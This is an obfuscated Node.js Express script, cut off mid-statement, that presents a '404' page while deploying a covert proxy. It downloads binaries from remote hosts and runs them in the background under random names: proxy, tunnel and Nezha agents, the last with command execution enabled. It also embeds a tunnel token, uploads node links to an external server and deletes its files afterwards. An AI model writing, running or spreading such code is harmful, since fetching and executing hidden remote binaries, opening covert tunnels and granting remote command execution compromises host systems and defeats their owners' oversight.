const _0x366dbb=_0x9e1a;(function(_0x36ca68,_0x7f96f0){const _0x1d4ec9=_0x9e1a,_0x368c32=_0x36ca68();while(!![]){try{const _0x3c8e02=parseInt(_0x1d4ec9(0x1c4))/0x1*(-parseInt(_0x1d4ec9(0x168))/0x2)+parseInt(_0x1d4ec9(0x167))/0x3+-parseInt(_0x1d4ec9(0x18c))/0x4+-parseInt(_0x1d4ec9(0x157))/0x5*(-parseInt(_0x1d4ec9(0x1a9))/0x6)+parseInt(_0x1d4ec9(0x1ee))/0x7*(parseInt(_0x1d4ec9(0x1f0))/0x8)+parseInt(_0x1d4ec9(0x143))/0x9+-parseInt(_0x1d4ec9(0x1ad))/0xa*(-parseInt(_0x1d4ec9(0x1de))/0xb);if(_0x3c8e02===_0x7f96f0)break;else _0x368c32['push'](_0x368c32['shift']());}catch(_0x10a4d6){_0x368c32['push'](_0x368c32['shift']());}}}(_0x3d30,0x9a911));const express=require(_0x366dbb(0x13b)),app=express(),axios=require(_0x366dbb(0x1bc)),os=require('os'),fs=require('fs'),path=require(_0x366dbb(0x12f)),{promisify}=require('util'),exec=promisify(require('child_process')['exec']),{execSync}=require(_0x366dbb(0x1ed)),UPLOAD_URL=process[_0x366dbb(0x15e)][_0x366dbb(0x19d)]||'',PROJECT_URL=process[_0x366dbb(0x15e)][_0x366dbb(0x1d7)]||'',AUTO_ACCESS=process[_0x366dbb(0x15e)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x366dbb(0x15e)]['FILE_PATH']||_0x366dbb(0x1e6),SUB_PATH=process[_0x366dbb(0x15e)][_0x366dbb(0x17a)]||_0x366dbb(0x17d),PORT=process[_0x366dbb(0x15e)][_0x366dbb(0x190)]||process[_0x366dbb(0x15e)]['PORT']||0xbb8,UUID=process['env'][_0x366dbb(0x14e)]||_0x366dbb(0x197),NEZHA_SERVER=process[_0x366dbb(0x15e)][_0x366dbb(0x1b7)]||'',NEZHA_PORT=process[_0x366dbb(0x15e)][_0x366dbb(0x1a7)]||'',NEZHA_KEY=process['env'][_0x366dbb(0x178)]||'',ARGO_DOMAIN=process[_0x366dbb(0x15e)][_0x366dbb(0x18b)]||_0x366dbb(0x1a5),ARGO_AUTH=process[_0x366dbb(0x15e)][_0x366dbb(0x17e)]||_0x366dbb(0x1b6),ARGO_PORT=process[_0x366dbb(0x15e)][_0x366dbb(0x172)]||0x1f41,CFIP=process['env'][_0x366dbb(0x13c)]||_0x366dbb(0x163),CFPORT=process['env'][_0x366dbb(0x1e4)]||0x1bb,NAME=process[_0x366dbb(0x15e)][_0x366dbb(0x15c)]||'';!fs[_0x366dbb(0x1d5)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x366dbb(0x193)](FILE_PATH+_0x366dbb(0x1b3))):console['log'](FILE_PATH+_0x366dbb(0x191));function generateRandomName(){const _0x18f0ec=_0x366dbb,_0x3ac2d3=_0x18f0ec(0x1b8);let _0x1cce77='';for(let _0x248877=0x0;_0x248877<0x6;_0x248877++){_0x1cce77+=_0x3ac2d3[_0x18f0ec(0x175)](Math[_0x18f0ec(0x155)](Math[_0x18f0ec(0x148)]()*_0x3ac2d3[_0x18f0ec(0x136)]));}return _0x1cce77;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x366dbb(0x1a2)](FILE_PATH,npmName),phpPath=path[_0x366dbb(0x1a2)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x366dbb(0x1a2)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x366dbb(0x140)),listPath=path[_0x366dbb(0x1a2)](FILE_PATH,'list.txt'),bootLogPath=path[_0x366dbb(0x1a2)](FILE_PATH,'boot.log'),configPath=path[_0x366dbb(0x1a2)](FILE_PATH,'config.json');function deleteNodes(){const _0x5a81fb=_0x366dbb;try{if(!UPLOAD_URL)return;if(!fs[_0x5a81fb(0x1d5)](subPath))return;let _0xe9805a;try{_0xe9805a=fs[_0x5a81fb(0x1b2)](subPath,_0x5a81fb(0x1bd));}catch{return null;}const _0x515cf6=Buffer[_0x5a81fb(0x1e8)](_0xe9805a,'base64')[_0x5a81fb(0x1e7)](_0x5a81fb(0x1bd)),_0x5c20b7=_0x515cf6[_0x5a81fb(0x137)]('\x0a')[_0x5a81fb(0x1ca)](_0x19f745=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5a81fb(0x15f)](_0x19f745));if(_0x5c20b7[_0x5a81fb(0x136)]===0x0)return;return axios[_0x5a81fb(0x15d)](UPLOAD_URL+_0x5a81fb(0x1b1),JSON[_0x5a81fb(0x14a)]({'nodes':_0x5c20b7}),{'headers':{'Content-Type':_0x5a81fb(0x135)}})[_0x5a81fb(0x1cd)](_0x507654=>{return null;}),null;}catch(_0x3d75de){return null;}}function cleanupOldFiles(){const _0x2bca3a=_0x366dbb;try{const _0x1fe89f=fs['readdirSync'](FILE_PATH);_0x1fe89f[_0x2bca3a(0x1c7)](_0x4da070=>{const _0x4e44ff=_0x2bca3a,_0x39fa83=path[_0x4e44ff(0x1a2)](FILE_PATH,_0x4da070);try{fs['unlinkSync'](_0x39fa83),console[_0x4e44ff(0x193)](_0x4e44ff(0x153)+_0x39fa83);}catch(_0x57c9a2){console['error']('Failed\x20to\x20delete\x20file:\x20'+_0x39fa83,_0x57c9a2);}});}catch(_0x189495){console['error']('Failed\x20to\x20read\x20directory:\x20'+FILE_PATH,_0x189495);}}app['get']('/',function(_0x294821,_0x4ddf76){const _0xc84dad=_0x366dbb;_0x4ddf76[_0xc84dad(0x182)]('404');});async function generateConfig(){const _0x72c889=_0x366dbb,_0x1da821={'log':{'access':_0x72c889(0x165),'error':'/dev/null','loglevel':_0x72c889(0x1bf)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x72c889(0x1e1),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x72c889(0x1bf),'fallbacks':[{'dest':0xbb9},{'path':_0x72c889(0x159),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x72c889(0x1cb)}},{'port':0xbb9,'listen':_0x72c889(0x1dd),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x72c889(0x1cb),'security':_0x72c889(0x1bf)}},{'port':0xbba,'listen':_0x72c889(0x1dd),'protocol':_0x72c889(0x1e1),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x72c889(0x1bf)},'streamSettings':{'network':'ws','security':_0x72c889(0x1bf),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x72c889(0x1e2),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x72c889(0x1dd),'protocol':_0x72c889(0x1ec),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x72c889(0x1ce),_0x72c889(0x1e2),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x72c889(0x1dd),'protocol':_0x72c889(0x15a),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x72c889(0x1bf),'wsSettings':{'path':_0x72c889(0x19a)}},'sniffing':{'enabled':!![],'destOverride':[_0x72c889(0x1ce),_0x72c889(0x1e2),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x72c889(0x131)]},'outbounds':[{'protocol':_0x72c889(0x1cc),'tag':_0x72c889(0x14c)},{'protocol':_0x72c889(0x1db),'tag':_0x72c889(0x1c6)}]};fs['writeFileSync'](path['join'](FILE_PATH,_0x72c889(0x156)),JSON['stringify'](_0x1da821,null,0x2));}function getSystemArchitecture(){const _0x1a7d38=_0x366dbb,_0xfbf5b4=os[_0x1a7d38(0x1d6)]();return _0xfbf5b4===_0x1a7d38(0x18e)||_0xfbf5b4===_0x1a7d38(0x1cf)||_0xfbf5b4===_0x1a7d38(0x16f)?_0x1a7d38(0x18e):_0x1a7d38(0x1c2);}function downloadFile(_0x22e925,_0x3d5901,_0x369c6e){const _0x2dba3b=_0x366dbb,_0x4a47bc=_0x22e925;!fs[_0x2dba3b(0x1d5)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x4195b6=fs[_0x2dba3b(0x1c0)](_0x4a47bc);axios({'method':_0x2dba3b(0x174),'url':_0x3d5901,'responseType':_0x2dba3b(0x1ac)})[_0x2dba3b(0x169)](_0x1988f5=>{const _0x252b80=_0x2dba3b;_0x1988f5[_0x252b80(0x170)][_0x252b80(0x13f)](_0x4195b6),_0x4195b6['on'](_0x252b80(0x1d9),()=>{const _0x4b621e=_0x252b80;_0x4195b6['close'](),console[_0x4b621e(0x193)](_0x4b621e(0x176)+path['basename'](_0x4a47bc)+_0x4b621e(0x130)),_0x369c6e(null,_0x4a47bc);}),_0x4195b6['on'](_0x252b80(0x186),_0x7da50d=>{const _0x2af310=_0x252b80;fs['unlink'](_0x4a47bc,()=>{});const _0x21acda=_0x2af310(0x176)+path['basename'](_0x4a47bc)+_0x2af310(0x17b)+_0x7da50d['message'];console[_0x2af310(0x186)](_0x21acda),_0x369c6e(_0x21acda);});})[_0x2dba3b(0x1cd)](_0xe58ec5=>{const _0x147b21=_0x2dba3b,_0x4118f9=_0x147b21(0x176)+path[_0x147b21(0x1ef)](_0x4a47bc)+_0x147b21(0x17b)+_0xe58ec5[_0x147b21(0x1d4)];console[_0x147b21(0x186)](_0x4118f9),_0x369c6e(_0x4118f9);});}async function downloadFilesAndRun(){const _0x3eb2b0=_0x366dbb,_0x1f71f6=getSystemArchitecture(),_0x336f59=getFilesForArchitecture(_0x1f71f6);if(_0x336f59[_0x3eb2b0(0x136)]===0x0){console[_0x3eb2b0(0x193)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x17045d=_0x336f59[_0x3eb2b0(0x164)](_0x5dd256=>{return new Promise((_0x36058a,_0x17fd2b)=>{const _0x1275ac=_0x9e1a;downloadFile(_0x5dd256[_0x1275ac(0x177)],_0x5dd256['fileUrl'],(_0x3c624f,_0x389b58)=>{_0x3c624f?_0x17fd2b(_0x3c624f):_0x36058a(_0x389b58);});});});try{await Promise[_0x3eb2b0(0x1c3)](_0x17045d);}catch(_0x20a615){console[_0x3eb2b0(0x186)](_0x3eb2b0(0x1d3),_0x20a615);return;}function _0x55e5cf(_0x3fcfaa){const _0x18b99b=0x1fd;_0x3fcfaa['forEach'](_0x46d003=>{const _0x5a1eb4=_0x9e1a;fs[_0x5a1eb4(0x1d5)](_0x46d003)&&fs[_0x5a1eb4(0x12e)](_0x46d003,_0x18b99b,_0x198835=>{const _0xc67283=_0x5a1eb4;_0x198835?console[_0xc67283(0x186)](_0xc67283(0x194)+_0x46d003+':\x20'+_0x198835):console['log'](_0xc67283(0x19f)+_0x46d003+':\x20'+_0x18b99b['toString'](0x8));});});}const _0x5962bb=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x55e5cf(_0x5962bb);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5e08e6=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x3eb2b0(0x137)](':')[_0x3eb2b0(0x13e)]():'',_0x2c6573=new Set([_0x3eb2b0(0x19c),'8443',_0x3eb2b0(0x1e0),_0x3eb2b0(0x179),_0x3eb2b0(0x18f),_0x3eb2b0(0x152)]),_0x1d20a6=_0x2c6573['has'](_0x5e08e6)?_0x3eb2b0(0x1a0):_0x3eb2b0(0x1d2),_0x49892f=_0x3eb2b0(0x158)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x3eb2b0(0x139)+_0x1d20a6+_0x3eb2b0(0x1e9)+UUID;fs['writeFileSync'](path['join'](FILE_PATH,'config.yaml'),_0x49892f);const _0x18e65d=_0x3eb2b0(0x14d)+phpPath+_0x3eb2b0(0x151)+FILE_PATH+_0x3eb2b0(0x188);try{await exec(_0x18e65d),console[_0x3eb2b0(0x193)](phpName+_0x3eb2b0(0x150)),await new Promise(_0x58d75d=>setTimeout(_0x58d75d,0x3e8));}catch(_0x22bbd3){console['error'](_0x3eb2b0(0x1e3)+_0x22bbd3);}}else{let _0x5c26eb='';const _0x368258=[_0x3eb2b0(0x19c),_0x3eb2b0(0x147),_0x3eb2b0(0x1e0),'2087',_0x3eb2b0(0x18f),_0x3eb2b0(0x152)];_0x368258['includes'](NEZHA_PORT)&&(_0x5c26eb=_0x3eb2b0(0x142));const _0x4e6507=_0x3eb2b0(0x14d)+npmPath+_0x3eb2b0(0x145)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3eb2b0(0x138)+NEZHA_KEY+'\x20'+_0x5c26eb+_0x3eb2b0(0x162);try{await exec(_0x4e6507),console[_0x3eb2b0(0x193)](npmName+_0x3eb2b0(0x150)),await new Promise(_0x7abcae=>setTimeout(_0x7abcae,0x3e8));}catch(_0x6b7808){console[_0x3eb2b0(0x186)]('npm\x20running\x20error:\x20'+_0x6b7808);}}}else console[_0x3eb2b0(0x193)](_0x3eb2b0(0x13d));const _0x1dba13='nohup\x20'+webPath+_0x3eb2b0(0x184)+FILE_PATH+_0x3eb2b0(0x133);try{await exec(_0x1dba13),console['log'](webName+_0x3eb2b0(0x150)),await new Promise(_0xc162b1=>setTimeout(_0xc162b1,0x3e8));}catch(_0x39486c){console[_0x3eb2b0(0x186)]('web\x20running\x20error:\x20'+_0x39486c);}if(fs[_0x3eb2b0(0x1d5)](botPath)){let _0xf68d7c;if(ARGO_AUTH[_0x3eb2b0(0x1d1)](/^[A-Z0-9a-z=]{120,250}$/))_0xf68d7c=_0x3eb2b0(0x183)+ARGO_AUTH;else ARGO_AUTH[_0x3eb2b0(0x1d1)](/TunnelSecret/)?_0xf68d7c=_0x3eb2b0(0x16c)+FILE_PATH+_0x3eb2b0(0x189):_0xf68d7c=_0x3eb2b0(0x1f1)+FILE_PATH+_0x3eb2b0(0x1d0)+ARGO_PORT;try{await exec(_0x3eb2b0(0x14d)+botPath+'\x20'+_0xf68d7c+_0x3eb2b0(0x1df)),console[_0x3eb2b0(0x193)](botName+_0x3eb2b0(0x150)),await new Promise(_0x35f0be=>setTimeout(_0x35f0be,0x7d0));}catch(_0x1c31bf){console['error'](_0x3eb2b0(0x1a8)+_0x1c31bf);}}await new Promise(_0x2f1491=>setTimeout(_0x2f1491,0x1388));}function getFilesForArchitecture(_0x52dd31){const _0xaffd0f=_0x366dbb;let _0x400d02;_0x52dd31===_0xaffd0f(0x18e)?_0x400d02=[{'fileName':webPath,'fileUrl':_0xaffd0f(0x192)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x400d02=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0xaffd0f(0x160)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x329ef1=_0x52dd31===_0xaffd0f(0x18e)?_0xaffd0f(0x1ba):_0xaffd0f(0x1ae);_0x400d02['unshift']({'fileName':npmPath,'fileUrl':_0x329ef1});}else{const _0x4dbf72=_0x52dd31==='arm'?_0xaffd0f(0x1c9):_0xaffd0f(0x1ab);_0x400d02['unshift']({'fileName':phpPath,'fileUrl':_0x4dbf72});}}return _0x400d02;}function argoType(){const _0x2c9d22=_0x366dbb;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2c9d22(0x193)](_0x2c9d22(0x1b4));return;}if(ARGO_AUTH[_0x2c9d22(0x195)](_0x2c9d22(0x187))){fs['writeFileSync'](path[_0x2c9d22(0x1a2)](FILE_PATH,_0x2c9d22(0x146)),ARGO_AUTH);const _0x30fcaa=_0x2c9d22(0x16b)+ARGO_AUTH[_0x2c9d22(0x137)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,_0x2c9d22(0x146))+_0x2c9d22(0x14b)+ARGO_DOMAIN+_0x2c9d22(0x1e5)+ARGO_PORT+_0x2c9d22(0x1bb);fs[_0x2c9d22(0x1c1)](path[_0x2c9d22(0x1a2)](FILE_PATH,_0x2c9d22(0x196)),_0x30fcaa);}else console[_0x2c9d22(0x193)](_0x2c9d22(0x17c));}function _0x9e1a(_0x148449,_0x39305f){const _0x3d30fb=_0x3d30();return _0x9e1a=function(_0x9e1a18,_0x546118){_0x9e1a18=_0x9e1a18-0x12d;let _0x2f99a0=_0x3d30fb[_0x9e1a18];return _0x2f99a0;},_0x9e1a(_0x148449,_0x39305f);}argoType();async function extractDomains(){const _0xbeb877=_0x366dbb;let _0x466786;if(ARGO_AUTH&&ARGO_DOMAIN)_0x466786=ARGO_DOMAIN,console[_0xbeb877(0x193)](_0xbeb877(0x1b9),_0x466786),await _0x3b412d(_0x466786);else try{const _0x397789=fs['readFileSync'](path[_0xbeb877(0x1a2)](FILE_PATH,_0xbeb877(0x161)),_0xbeb877(0x1bd)),_0x117680=_0x397789[_0xbeb877(0x137)]('\x0a'),_0x211613=[];_0x117680['forEach'](_0x5566a8=>{const _0x33e006=_0xbeb877,_0x54f8f5=_0x5566a8[_0x33e006(0x1d1)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x54f8f5){const _0x1d4522=_0x54f8f5[0x1];_0x211613[_0x33e006(0x18d)](_0x1d4522);}});if(_0x211613[_0xbeb877(0x136)]>0x0)_0x466786=_0x211613[0x0],console[_0xbeb877(0x193)](_0xbeb877(0x1ea),_0x466786),await _0x3b412d(_0x466786);else{console[_0xbeb877(0x193)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0xbeb877(0x199)](path[_0xbeb877(0x1a2)](FILE_PATH,'boot.log'));async function _0x5c6a69(){const _0x4b5327=_0xbeb877;try{process[_0x4b5327(0x1d8)]===_0x4b5327(0x14f)?await exec(_0x4b5327(0x1a3)+botName+_0x4b5327(0x1a4)):await exec(_0x4b5327(0x18a)+botName[_0x4b5327(0x175)](0x0)+']'+botName[_0x4b5327(0x1af)](0x1)+_0x4b5327(0x1b0));}catch(_0x1572e3){}}_0x5c6a69(),await new Promise(_0x2e5a11=>setTimeout(_0x2e5a11,0xbb8));const _0xcaaee2=_0xbeb877(0x1f1)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0xbeb877(0x14d)+botPath+'\x20'+_0xcaaee2+_0xbeb877(0x1df)),console[_0xbeb877(0x193)](botName+_0xbeb877(0x150)),await new Promise(_0x21fcb1=>setTimeout(_0x21fcb1,0xbb8)),await extractDomains();}catch(_0x548607){console[_0xbeb877(0x186)](_0xbeb877(0x1a8)+_0x548607);}}}catch(_0x5cc570){console[_0xbeb877(0x186)]('Error\x20reading\x20boot.log:',_0x5cc570);}async function _0x3b412d(_0x59842e){const _0x5ae2ef=_0xbeb877,_0x1128cd=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x5ae2ef(0x1bd)}),_0xc801f7=_0x1128cd[_0x5ae2ef(0x132)](),_0x1ac5c8=NAME?NAME+'-'+_0xc801f7:_0xc801f7;return new Promise(_0x73b2cb=>{setTimeout(()=>{const _0x514499=_0x9e1a,_0xbab2dc={'v':'2','ps':''+_0x1ac5c8,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x59842e,'path':_0x514499(0x1eb),'tls':_0x514499(0x1e2),'sni':_0x59842e,'alpn':'','fp':_0x514499(0x134)},_0x9e9461=_0x514499(0x144)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x59842e+_0x514499(0x180)+_0x59842e+_0x514499(0x1b5)+_0x1ac5c8+'\x0a\x20\x20\x0avmess://'+Buffer[_0x514499(0x1e8)](JSON[_0x514499(0x14a)](_0xbab2dc))[_0x514499(0x1e7)](_0x514499(0x15b))+_0x514499(0x19b)+UUID+'@'+CFIP+':'+CFPORT+_0x514499(0x1c5)+_0x59842e+_0x514499(0x180)+_0x59842e+_0x514499(0x1dc)+_0x1ac5c8+_0x514499(0x16a);console['log'](Buffer[_0x514499(0x1e8)](_0x9e9461)[_0x514499(0x1e7)](_0x514499(0x15b))),fs[_0x514499(0x1c1)](subPath,Buffer[_0x514499(0x1e8)](_0x9e9461)[_0x514499(0x1e7)](_0x514499(0x15b))),console[_0x514499(0x193)](FILE_PATH+_0x514499(0x154)),uploadNodes(),app[_0x514499(0x174)]('/'+SUB_PATH,(_0x3fafcf,_0x311be9)=>{const _0x5d84e2=_0x514499,_0x3fbd08=Buffer[_0x5d84e2(0x1e8)](_0x9e9461)[_0x5d84e2(0x1e7)](_0x5d84e2(0x15b));_0x311be9['set'](_0x5d84e2(0x1be),_0x5d84e2(0x1c8)),_0x311be9[_0x5d84e2(0x182)](_0x3fbd08);}),_0x73b2cb(_0x9e9461);},0x7d0);});}}async function uploadNodes(){const _0x3a5444=_0x366dbb;if(UPLOAD_URL&&PROJECT_URL){const _0x1b195b=PROJECT_URL+'/'+SUB_PATH,_0x413671={'subscription':[_0x1b195b]};try{const _0x120975=await axios[_0x3a5444(0x15d)](UPLOAD_URL+_0x3a5444(0x1aa),_0x413671,{'headers':{'Content-Type':'application/json'}});return _0x120975&&_0x120975[_0x3a5444(0x173)]===0xc8?(console[_0x3a5444(0x193)](_0x3a5444(0x149)),_0x120975):null;}catch(_0x5a9e0e){if(_0x5a9e0e[_0x3a5444(0x171)]){if(_0x5a9e0e[_0x3a5444(0x171)][_0x3a5444(0x173)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x3a5822=fs[_0x3a5444(0x1b2)](listPath,_0x3a5444(0x1bd)),_0x5acd66=_0x3a5822[_0x3a5444(0x137)]('\x0a')[_0x3a5444(0x1ca)](_0x42cf61=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3a5444(0x15f)](_0x42cf61));if(_0x5acd66[_0x3a5444(0x136)]===0x0)return;const _0x483752=JSON[_0x3a5444(0x14a)]({'nodes':_0x5acd66});try{const _0x56897d=await axios['post'](UPLOAD_URL+_0x3a5444(0x12d),_0x483752,{'headers':{'Content-Type':'application/json'}});return _0x56897d&&_0x56897d[_0x3a5444(0x173)]===0xc8?(console['log'](_0x3a5444(0x13a)),_0x56897d):null;}catch(_0x5d4ea4){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x256463=_0x9e1a,_0xd32294=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0xd32294[_0x256463(0x18d)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xd32294[_0x256463(0x18d)](phpPath);process[_0x256463(0x1d8)]===_0x256463(0x14f)?exec(_0x256463(0x141)+_0xd32294[_0x256463(0x1a2)]('\x20')+'\x20>\x20nul\x202>&1',_0x5e0eac=>{const _0x4c1472=_0x256463;console[_0x4c1472(0x198)](),console[_0x4c1472(0x193)](_0x4c1472(0x1a1)),console[_0x4c1472(0x193)](_0x4c1472(0x185));}):exec(_0x256463(0x17f)+_0xd32294[_0x256463(0x1a2)]('\x20')+_0x256463(0x1da),_0xf6d7d4=>{const _0x4d2781=_0x256463;console['clear'](),console['log'](_0x4d2781(0x1a1)),console[_0x4d2781(0x193)](_0x4d2781(0x185));});},0x15f90);}function _0x3d30(){const _0xb9824c=['tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x20-c\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','error','TunnelSecret','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','/tunnel.yml\x20run','pkill\x20-f\x20\x22[','ARGO_DOMAIN','3323628zpTSPA','push','arm','2083','SERVER_PORT','\x20already\x20exists','https://arm64.ssss.nyc.mn/web','log','Empowerment\x20failed\x20for\x20','includes','tunnel.yml','8223b0c8-1379-4721-985e-25c5e4b26c2e','clear','unlinkSync','/trojan-argo','\x0a\x20\x20\x0atrojan://','443','UPLOAD_URL','Unhandled\x20error\x20in\x20startserver:','Empowerment\x20success\x20for\x20','true','App\x20is\x20running','join','taskkill\x20/f\x20/im\x20','.exe\x20>\x20nul\x202>&1','cdn.dqpb.dpdns.org','http\x20server\x20is\x20running\x20on\x20port:','NEZHA_PORT','Error\x20executing\x20command:\x20','3930wRRnfd','/api/add-subscriptions','https://amd64.ssss.nyc.mn/v1','stream','26330HxJBJG','https://amd64.ssss.nyc.mn/agent','substring','\x22\x20>\x20/dev/null\x202>&1','/api/delete-nodes','readFileSync','\x20is\x20created','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','&path=%2Fvless-argo%3Fed%3D2560#','eyJhIjoiN2ZmY2MwMjMyM2U4OTFlNTk4MTZlMTljNzg3Nzg1NDYiLCJ0IjoiMGVlZDcxMjctM2Y1MS00M2FkLWJhNDMtNDg0ZDFjODM4NmIwIiwicyI6Ik4ySTJNemcwWWpFdFlUWXdaaTAwT0RNNUxXSXhaamN0TVRZNE56WXlaVEppWkdOaiJ9','NEZHA_SERVER','abcdefghijklmnopqrstuvwxyz','ARGO_DOMAIN:','https://arm64.ssss.nyc.mn/agent','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','axios','utf-8','Content-Type','none','createWriteStream','writeFileSync','amd','all','32061WRjEVi','?security=tls&sni=','block','forEach','text/plain;\x20charset=utf-8','https://arm64.ssss.nyc.mn/v1','filter','tcp','freedom','catch','http','arm64','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','match','false','Error\x20downloading\x20files:','message','existsSync','arch','PROJECT_URL','platform','finish','\x20>/dev/null\x202>&1','blackhole','&path=%2Ftrojan-argo%3Fed%3D2560#','127.0.0.1','836QLtgZe','\x20>/dev/null\x202>&1\x20&','2096','vless','tls','php\x20running\x20error:\x20','CFPORT','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','./tmp','toString','from','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','ArgoDomain:','/vmess-argo?ed=2560','vmess','child_process','4354oVzgRn','basename','4192hFxBrs','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/api/add-nodes','chmod','path','\x20successfully','https+local://8.8.8.8/dns-query','trim','/config.json\x20>/dev/null\x202>&1\x20&','firefox','application/json','length','split','\x20-p\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Nodes\x20uploaded\x20successfully','express','CFIP','NEZHA\x20variable\x20is\x20empty,skip\x20running','pop','pipe','sub.txt','del\x20/f\x20/q\x20','--tls','9533673WxeFev','\x0avless://','\x20-s\x20','tunnel.json','8443','random','Subscription\x20uploaded\x20successfully','stringify','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','direct','nohup\x20','UUID','win32','\x20is\x20running','\x20-c\x20\x22','2053','Deleted\x20file:\x20','/sub.txt\x20saved\x20successfully','floor','config.json','4205bYnYPT','\x0aclient_secret:\x20','/vless-argo','trojan','base64','NAME','post','env','test','https://amd64.ssss.nyc.mn/bot','boot.log','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','cdns.doon.eu.org','map','/dev/null','listen','195681JJYfOx','46XWMLjx','then','\x0a\x20\x20\x20\x20','\x0a\x20\x20tunnel:\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','https://cachefly.cachefly.net/add-url','Add\x20automatic\x20access\x20task\x20faild:\x20','aarch64','data','response','ARGO_PORT','status','get','charAt','Download\x20','fileName','NEZHA_KEY','2087','SUB_PATH','\x20failed:\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','webcdndns','ARGO_AUTH','rm\x20-rf\x20','&fp=firefox&type=ws&host=','automatic\x20access\x20task\x20added\x20successfully','send'];_0x3d30=function(){return _0xb9824c;};return _0x3d30();}cleanFiles();async function AddVisitTask(){const _0x52c82c=_0x366dbb;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x52c82c(0x193)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x5c3b2e=await axios[_0x52c82c(0x15d)](_0x52c82c(0x16d),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x52c82c(0x135)}});return console['log'](_0x52c82c(0x181)),_0x5c3b2e;}catch(_0x841730){return console[_0x52c82c(0x186)](_0x52c82c(0x16e)+_0x841730[_0x52c82c(0x1d4)]),null;}}async function startserver(){const _0x298bb8=_0x366dbb;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await 